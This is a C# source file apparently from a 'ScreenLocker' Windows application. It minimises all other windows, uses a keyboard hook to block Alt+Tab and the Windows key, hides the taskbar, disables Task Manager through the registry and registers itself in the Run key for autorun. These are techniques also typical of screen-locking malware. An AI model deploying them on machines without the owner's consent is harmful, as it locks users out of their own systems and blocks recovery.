using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ScreenLocker.Common.LockFunctions
{
    public class Lock
    {
        public const int GWL_EX_STYLE = -20;
        public const int WS_EX_APPWINDOW = 0x00040000, WS_EX_TOOLWINDOW = 0x00000080;
        [DllImport("user32.dll", SetLastError = true)]
        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")]
        public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, int hMod, int dwThreadId);
        [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int UnhookWindowsHookEx(int hHook);
        public delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
        [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int CallNextHookEx(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
        public const int WH_KEYBOARD_LL = 13;
        [DllImport("user32.dll")]
        public static extern int FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        public static extern int ShowWindow(int hwnd, int command);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 1;
        public struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }
        public static int intLLKey;
        /// <summary>
        /// Функция, которая сворачивает все окна
        /// </summary>
        public static void getProc()
        {
            System.Diagnostics.Process[] etc = System.Diagnostics.Process.GetProcesses();//получаем процессы
            foreach (System.Diagnostics.Process anti in etc)//перебираем
            {
                if (anti.MainWindowTitle.ToString() != "")//отлавливаем процессы, которые имеют окна
                {
                    if (!anti.MainWindowTitle.ToString().Equals("LockScreen"))
                    {
                        ShowWindow((int)anti.MainWindowHandle, 6);//сворачивам окна
                    }
                }
            }
        }


        /// <summary>
        /// 
        /// </summary>
        //private int m_hHook;
        //private int m_hHook_1;
        //private int m_hHook_2;
        //private int m_hHook_3;
        //private int m_hHook_4;
        //private int m_hHook_5;
        //private int m_hHook_6;
        //public void Unhook()
        //{
        //    m_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback, GetModuleHandle(IntPtr.Zero), 0);
        //    m_hHook_1 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_1, GetModuleHandle(IntPtr.Zero), 0);
        //    m_hHook_2 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_2, GetModuleHandle(IntPtr.Zero), 0);
        //    m_hHook_3 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_3, GetModuleHandle(IntPtr.Zero), 0);
        //    m_hHook_4 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_4, GetModuleHandle(IntPtr.Zero), 0);
        //    m_hHook_5 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_5, GetModuleHandle(IntPtr.Zero), 0);
        //    m_hHook_6 = SetWindowsHookEx(WH_KEYBOARD_LL, m_callback_6, GetModuleHandle(IntPtr.Zero), 0);
        //    UnhookWindowsHookEx(m_hHook);
        //    UnhookWindowsHookEx(m_hHook_1);
        //    UnhookWindowsHookEx(m_hHook_2);
        //    UnhookWindowsHookEx(m_hHook_3);
        //    UnhookWindowsHookEx(m_hHook_4);
        //    UnhookWindowsHookEx(m_hHook_5);
        //    UnhookWindowsHookEx(m_hHook_6);
        //}
        /// <summary>
        /// 
        /// </summary>
        /// <param name="autorun"></param>
        /// <returns></returns>
        public static bool SetAutorunValue(bool autorun)
        {
            string name = "ScreenLocker";//Application name
            string ExePath = System.Windows.Forms.Application.ExecutablePath;//Current path
                                                                             //of application execution
            RegistryKey reg;//Class for working with Windows registry
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");//Subkey creating in registry
            try
            {
                if (autorun)
                {
                    reg.SetValue(name, ExePath);//If success - then set an autoran key values
                                                //according to this application
                }
                else
                {
                    reg.DeleteValue(name);//If failed - delete a created key
                }
                reg.Close();//Write data to registry and close it
            }
            catch
            {
                return false;//If exception (fail)
            }
            return true;//If success
        }


        public static int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
        {
            bool blnEat = false;

            switch (wParam)
            {
                case 256:
                case 257:
                case 260:
                case 261:
                    //Alt+Tab, Alt+Esc, Ctrl+Esc, Windows Key,
                    blnEat = ((lParam.vkCode == 9) && (lParam.flags == 32)) | ((lParam.vkCode == 27) && (lParam.flags == 32)) | ((lParam.vkCode == 27) && (lParam.flags == 0)) | ((lParam.vkCode == 91) && (lParam.flags == 1)) | ((lParam.vkCode == 92) && (lParam.flags == 1)) | ((lParam.vkCode == 73) && (lParam.flags == 0));
                    break;
            }

            if (blnEat == true)
            {
                return 1;
            }
            else
            {
                return CallNextHookEx(0, nCode, wParam, ref lParam);
            }
        }
        public static void KillStartMenu()
        {
            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_HIDE);
        }
        public static void ShowStartMenu()
        {
            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_SHOW);
        }
        /// <summary>
        /// Если true, то включает диспетчер
        /// </summary>
        /// <param name="enable"></param>
        public static void SetTaskManager(bool enable)
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (enable && objRegistryKey.GetValue("DisableTaskMgr") != null)
                objRegistryKey.DeleteValue("DisableTaskMgr");
                //objRegistryKey.SetValue("DisableTaskMgr", "0");
            else
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }

        const int WM_SYSCOMMAND = 0x0112;
        const int SC_MOVE = 0xF010;

        public static IntPtr WndProc(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam, ref bool handled)//
        {

            switch (msg)
            {
                case WM_SYSCOMMAND:
                    int command = wParam.ToInt32() & 0xfff0;
                    if (command == SC_MOVE)
                    {
                        handled = true;
                    }
                    break;
                default:
                    break;
            }
            return IntPtr.Zero;
        }
    }
}
